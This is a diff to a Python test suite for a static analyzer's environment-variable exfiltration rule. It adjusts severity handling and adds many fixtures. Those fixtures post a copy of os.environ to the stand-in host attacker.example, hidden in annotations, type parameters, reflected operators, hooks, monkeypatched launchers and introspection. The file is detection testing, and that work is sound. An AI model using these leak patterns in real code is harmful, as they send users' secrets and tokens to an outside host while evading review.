@@ -17,6 +17,7 @@
 
 from __future__ import annotations
 
+import sys
 import textwrap
 from pathlib import Path
 from time import perf_counter
@@ -70,11 +71,27 @@ def _in_main_guard(source: str) -> str:
     return 'if __name__ == "__main__":\n' + textwrap.indent(source, "    ")
 
 
-def _e2_start_lines(script: str) -> list[int]:
-    """Scan one Python file for data exfiltration and return the E2 start lines."""
+def _e2_findings(script: str) -> list:
+    """Scan one Python file for data exfiltration and return its E2 findings."""
     state = {"components": ["script.py"], "file_cache": {"script.py": script}}
     findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-    return [finding.start_line for finding in findings if finding.rule_id == "E2"]
+    return [finding for finding in findings if finding.rule_id == "E2"]
+
+
+def _e2_start_lines(script: str) -> list[int]:
+    """Return the start lines of the HIGH harvesting E2 findings in one Python file."""
+    return [f.start_line for f in _e2_findings(script) if f.severity == Severity.HIGH]
+
+
+def _e2_passthrough_lines(script: str) -> list[int]:
+    """Return the start lines of the LOW child-process pass-through E2 findings."""
+    return [f.start_line for f in _e2_findings(script) if f.severity == Severity.LOW]
+
+
+def _assert_e2_passthrough(script: str) -> None:
+    """The file's environment copies all pass through: reported LOW, never HIGH."""
+    assert not _e2_start_lines(script)
+    assert _e2_passthrough_lines(script)
 
 
 class TestRunStaticPatternsPromptInjection:
@@ -797,29 +814,24 @@ class TestRunStaticPatternsDataExfiltration:
         e2 = [f for f in findings if f.rule_id == "E2"]
         assert len(e2) >= 1
 
-    def test_e2_subprocess_env_dict_unpack_not_flagged(self):
-        """``env={**os.environ, ...}`` handed to a child process is not harvesting."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport subprocess\n"
-                    'subprocess.run(["git", "status"], env={**os.environ, "GIT_OPTIONAL_LOCKS": "0"})'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+    def test_e2_subprocess_env_dict_unpack_downgraded(self):
+        """``env={**os.environ, ...}`` handed to a child process is a LOW pass-through."""
+        e2 = _e2_findings(
+            "import os\nimport subprocess\n"
+            'subprocess.run(["git", "status"], env={**os.environ, "GIT_OPTIONAL_LOCKS": "0"})'
+        )
+        assert [(f.start_line, f.severity, f.confidence) for f in e2] == [(3, Severity.LOW, 0.2)]
+        assert e2[0].message == "Environment Pass-Through to Child Process"
 
     @pytest.mark.parametrize("wrap", [_in_function, _in_main_guard], ids=["function", "main-guard"])
-    def test_e2_subprocess_env_copy_via_variable_not_flagged(self, wrap):
-        """``env = os.environ.copy()`` passed to a child process is not harvesting."""
+    def test_e2_subprocess_env_copy_via_variable_downgraded(self, wrap):
+        """``env = os.environ.copy()`` passed to a child process is a LOW pass-through."""
         script = "import os\nimport subprocess\n" + wrap(
             "env = os.environ.copy()\n"
             'env["GIT_OPTIONAL_LOCKS"] = "0"\n'
             'subprocess.run(["git", "status"], env=env)'
         )
-        assert not _e2_start_lines(script)
+        _assert_e2_passthrough(script)
 
     @pytest.mark.parametrize(
         ("source", "copy_line"),
@@ -879,8 +891,8 @@ class TestRunStaticPatternsDataExfiltration:
         ids=["module-alias", "function-alias", "two-imports", "asyncio"],
     )
     def test_e2_imported_launcher_keeps_passthrough(self, source: str):
-        """A launcher bound only by an import of the real module keeps the exemption."""
-        assert not _e2_start_lines("import os\n" + source)
+        """A launcher bound only by an import of the real module keeps the pass-through."""
+        _assert_e2_passthrough("import os\n" + source)
 
     @pytest.mark.parametrize(
         "source",
@@ -970,7 +982,7 @@ class TestRunStaticPatternsDataExfiltration:
         )
         assert _e2_start_lines(script) == [5]
 
-    def test_e2_environ_copy_edited_in_place_before_subprocess_not_flagged(self):
+    def test_e2_environ_copy_edited_in_place_before_subprocess_downgraded(self):
         """In-place edits of the mapping keep it on the pass-through path."""
         script = "import os\nimport subprocess\n" + _in_function(
             "env = os.environ.copy()\n"
@@ -980,7 +992,7 @@ class TestRunStaticPatternsDataExfiltration:
             'del env["GIT_WORK_TREE"]\n'
             'subprocess.run(["git", "status"], env=env)'
         )
-        assert not _e2_start_lines(script)
+        _assert_e2_passthrough(script)
 
     @pytest.mark.parametrize(
         "shadow",
@@ -998,7 +1010,7 @@ class TestRunStaticPatternsDataExfiltration:
         script = "import os\nimport subprocess\n" + _in_function(
             f'env = os.environ.copy()\n{shadow}subprocess.run(["git", "status"], env=env)'
         )
-        assert not _e2_start_lines(script)
+        _assert_e2_passthrough(script)
 
     def test_e2_nested_scope_shadowing_does_not_hide_outer_leak(self):
         """A shadowed name inside a nested scope still leaves the outer copy's uses tracked."""
@@ -1053,6 +1065,105 @@ class TestRunStaticPatternsDataExfiltration:
     def test_e2_environ_copy_read_by_nested_scope_still_flagged(self, source: str):
         """A nested scope reading the outer copy counts against it, whenever it is defined."""
         assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + source)
+
+    _PASS_THROUGH = 'env = os.environ.copy()\nsubprocess.run(["git", "status"], env=env)\n'
+    _LEAK = 'requests.post("https://attacker.example/collect", json=env)'
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            _in_function(_PASS_THROUGH + f"def helper() -> {_LEAK}:\n    pass"),
+            _in_function(_PASS_THROUGH + f"async def helper() -> {_LEAK}:\n    pass"),
+            _in_function(_PASS_THROUGH + f"def helper(x: {_LEAK}, /):\n    pass"),
+            _in_function(_PASS_THROUGH + f"def helper(x: {_LEAK}):\n    pass"),
+            _in_function(_PASS_THROUGH + f"def helper(*args: {_LEAK}):\n    pass"),
+            _in_function(_PASS_THROUGH + f"def helper(*, x: {_LEAK}):\n    pass"),
+            _in_function(_PASS_THROUGH + f"def helper(**kwargs: {_LEAK}):\n    pass"),
+            # Lazy annotations (Python 3.14) run when read, after the copy exists.
+            _in_function(f"def helper() -> {_LEAK}:\n    pass\n" + _PASS_THROUGH),
+            _in_function(_PASS_THROUGH + f"class Helper:\n    field: {_LEAK}"),
+            _in_main_guard(_PASS_THROUGH + f"field: {_LEAK}"),
+            _in_main_guard(_PASS_THROUGH + f"field: {_LEAK} = None"),
+            _in_function(_PASS_THROUGH + f"def helper[T: {_LEAK}]():\n    pass"),
+            _in_function(_PASS_THROUGH + f"class Helper[T: {_LEAK}]:\n    pass"),
+            _in_function(_PASS_THROUGH + f"type Alias = {_LEAK}"),
+            # The alias value runs when read, after the copy exists.
+            _in_function(f"type Alias = {_LEAK}\n" + _PASS_THROUGH),
+        ],
+        ids=[
+            "return",
+            "async-return",
+            "positional-only",
+            "positional",
+            "varargs",
+            "keyword-only",
+            "kwargs",
+            "lazy-return",
+            "class-field",
+            "module-field",
+            "module-field-with-value",
+            "type-param-bound",
+            "class-type-param-bound",
+            "type-alias",
+            "lazy-type-alias",
+        ],
+    )
+    def test_e2_environ_copy_read_by_annotation_still_flagged(self, source: str):
+        """An annotation or type parameter that reads the copy counts against it."""
+        assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + source)
+
+    @pytest.mark.skipif(sys.version_info < (3, 13), reason="type parameter defaults need 3.13")
+    def test_e2_environ_copy_read_by_type_param_default_still_flagged(self):
+        """A type parameter default runs when read, so it counts against the copy."""
+        source = _in_function(self._PASS_THROUGH + f"def helper[T = {self._LEAK}]():\n    pass")
+        assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + source)
+
+    def test_e2_environ_copy_read_in_comprehension_target_still_flagged(self):
+        """A subscript target reads names; only the names it stores belong to the comprehension."""
+        source = _in_function(
+            self._PASS_THROUGH + f"scratch = {{}}\n[{self._LEAK} for scratch[env is None] in [0]]"
+        )
+        assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + source)
+
+    @pytest.mark.parametrize(
+        ("operator", "method"), [("+=", "__radd__"), ("-=", "__rsub__"), ("@=", "__rmatmul__")]
+    )
+    def test_e2_environ_copy_augmented_by_reflected_operand_still_flagged(
+        self, operator: str, method: str
+    ):
+        """A dict has no in-place method for these, so the operand receives the whole copy."""
+        sink = (
+            "class Sink:\n"
+            f"    def {method}(self, other):\n"
+            '        requests.post("https://attacker.example/collect", json=other)\n'
+            "        return other\n"
+        )
+        source = _in_function(
+            f"env = os.environ.copy()\nenv {operator} Sink()\n"
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + sink + source)
+
+    def test_e2_environ_copy_merged_in_place_downgraded(self):
+        """``|=`` is ``dict.__ior__``, an in-place update that keeps the pass-through."""
+        source = _in_function(
+            'env = os.environ.copy()\nenv |= {"GIT_OPTIONAL_LOCKS": "0"}\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        _assert_e2_passthrough("import os\nimport subprocess\n" + source)
+
+    def test_e2_environ_copy_with_unrelated_annotations_still_downgraded(self):
+        """Annotations that never read the copy keep the pass-through."""
+        source = _in_function(
+            self._PASS_THROUGH
+            + "def helper[T: int](value: T, *args: str, **kwargs: dict[str, str]) -> T:\n"
+            + "    return value\n"
+            + "class Helper:\n"
+            + "    field: dict[str, str]\n"
+            + '    other: "dict[str, Helper] | None"\n'
+            + "type Alias = dict[str, str]"
+        )
+        _assert_e2_passthrough("import os\nimport subprocess\n" + source)
 
     @pytest.mark.parametrize(
         "rebinding",
@@ -1183,7 +1294,7 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_control_flow_keeps_passthrough(self, source: str):
         """Branches and loops alone do not turn a pass-through into a finding."""
-        assert not _e2_start_lines("import os\nimport subprocess\n" + _in_function(source))
+        _assert_e2_passthrough("import os\nimport subprocess\n" + _in_function(source))
 
     @pytest.mark.parametrize(
         "drain",
@@ -1287,6 +1398,149 @@ class TestRunStaticPatternsDataExfiltration:
             + wrap('env = os.environ.copy()\nsubprocess.run(["true"], env=env)\n' + source)
         )
         assert _e2_start_lines(script)
+
+    @pytest.mark.parametrize(
+        "hook",
+        [
+            "sys.addaudithook(Recorder(URL))",
+            "sys.settrace(Recorder(URL))",
+            '__import__("sys").addaudithook(Recorder(URL))',
+            'eval(source, {"sys": sys})',
+        ],
+        ids=["audit-hook", "trace", "imported-by-call", "eval"],
+    )
+    def test_e2_inline_copy_with_hook_keeps_a_low_finding(self, hook: str):
+        """A hook inside the launcher is out of the flow pass's sight; the copy stays LOW."""
+        script = (
+            'import os\nimport subprocess\nimport sys\nURL = "https://attacker.example/collect"\n'
+            + hook
+            + '\nsubprocess.run(["git", "status"], env=os.environ.copy())'
+        )
+        assert _e2_passthrough_lines(script) == [6]
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "import subprocess\n"
+            "os.fsencode = Recorder(URL)\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\nimport sys\n"
+            "sys.audit = Recorder(URL)\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            '__import__("subprocess").Popen = Recorder(URL)\n'
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import asyncio\nimport subprocess\n"
+            "subprocess.Popen = Recorder(URL)\n"
+            "async def main():\n"
+            '    await asyncio.create_subprocess_exec("git", "status", env=os.environ.copy())',
+            "import asyncio\n"
+            "async def main():\n"
+            '    await asyncio.create_subprocess_exec("git", "status", env=os.environ.copy())\n'
+            "asyncio.run(main(), loop_factory=RecordingLoop)",
+            "import asyncio\n"
+            "class Loop(asyncio.SelectorEventLoop):\n"
+            "    async def subprocess_exec(self, factory, *args, env=None, **kwargs):\n"
+            "        requests.post(URL, json=env)\n"
+            "async def main():\n"
+            '    await asyncio.create_subprocess_exec("git", "status", env=os.environ.copy())\n'
+            "Loop().run_until_complete(main())",
+        ],
+        ids=[
+            "os-write",
+            "sys-write",
+            "unnamed-write",
+            "asyncio-popen-write",
+            "asyncio-loop-factory",
+            "asyncio-loop-subclass",
+        ],
+    )
+    def test_e2_launcher_side_channel_keeps_a_low_finding(self, source: str):
+        """Writes the launcher may reach are not modeled, but the copy is never dropped."""
+        script = 'import os\nimport requests\nURL = "https://attacker.example/collect"\n' + source
+        assert _e2_findings(script)
+
+    @pytest.mark.parametrize(
+        ("wrap", "source"),
+        [
+            (
+                _in_function,
+                "import inspect\n"
+                "frame = inspect.currentframe()\n"
+                'requests.post(URL, json=inspect.getargvalues(frame).locals["env"])',
+            ),
+            (
+                _in_function,
+                "import traceback\n"
+                "stack = traceback.walk_stack(None)\n"
+                "summary = traceback.StackSummary.extract(stack, capture_locals=True)\n"
+                'requests.post(URL, data="".join(summary.format()))',
+            ),
+            (
+                _in_function,
+                'frame_locals = getattr(sys._getframe(), "f_" + "locals")\n'
+                'requests.post(URL, json=frame_locals["env"])',
+            ),
+            (_in_function, 'name = "env"\nrequests.post(URL, json=getattr(Holder, name))'),
+            (_in_function, "import gc\nrequests.post(URL, data=repr(gc.get_objects()))"),
+            (_in_main_guard, "import __main__\nrequests.post(URL, json=__main__.env)"),
+            (
+                _in_main_guard,
+                'import importlib\nrequests.post(URL, json=importlib.import_module("__main__").env)',
+            ),
+            (
+                _in_main_guard,
+                'import pkgutil\nrequests.post(URL, json=pkgutil.resolve_name("__main__:env"))',
+            ),
+            (
+                _in_main_guard,
+                "import typing\n"
+                'def helper(value: "requests.post(URL, json=env)"):\n'
+                "    pass\n"
+                "typing.get_type_hints(helper)",
+            ),
+            (
+                _in_function,
+                "import typing\n"
+                'def helper(value: "env"):\n'
+                "    pass\n"
+                "requests.post(URL, json=typing.get_type_hints(helper))",
+            ),
+        ],
+        ids=[
+            "inspect-frame",
+            "traceback-capture-locals",
+            "computed-frame-attribute",
+            "computed-getattr",
+            "gc-objects",
+            "import-main",
+            "import-module-main",
+            "resolve-name-main",
+            "string-annotation-call",
+            "string-annotation-name",
+        ],
+    )
+    def test_e2_introspection_keeps_a_low_finding(self, wrap, source: str):
+        """Frames, ``gc``, ``__main__`` and string annotations are not modeled either."""
+        script = (
+            "import os\nimport requests\nimport subprocess\nimport sys\n"
+            'URL = "https://attacker.example/collect"\n'
+            + wrap('env = os.environ.copy()\nsubprocess.run(["true"], env=env)\n' + source)
+        )
+        assert _e2_findings(script)
+
+    def test_e2_environ_copy_with_unrelated_writes_still_downgraded(self):
+        """Item stores into ``os.environ`` and writes to the file's own objects keep it."""
+        source = _in_function(
+            'os.environ["GIT_TERMINAL_PROMPT"] = "0"\n'
+            "class Options:\n"
+            "    pass\n"
+            "options = Options()\n"
+            "options.quiet = True\n"
+            "env = os.environ.copy()\n"
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        _assert_e2_passthrough("import os\nimport subprocess\n" + source)
 
     def test_e2_deeply_nested_expression_keeps_findings(self):
         """An expression too deep for the flow pass falls back to reporting every copy."""
